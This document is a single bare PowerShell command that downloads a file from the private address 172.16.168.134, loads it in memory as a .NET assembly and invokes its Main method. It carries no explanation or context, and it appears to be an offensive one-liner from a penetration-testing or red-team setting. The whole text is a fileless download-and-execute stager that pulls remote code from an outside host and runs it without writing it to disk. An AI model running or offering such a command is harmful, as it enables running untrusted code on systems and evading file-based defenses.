powershell -c $m=new-object net.webclient;$Url='http://172.16.168.134/tools/pd'; $dllByteArray=$m.downloaddata($Url); $assembly=[System.Reflection.Assembly]::Load($dllByteArray); $t=$assembly.GetType('Program'); $m=$t.GetMethod('Main');$m.invoke($null, $null);
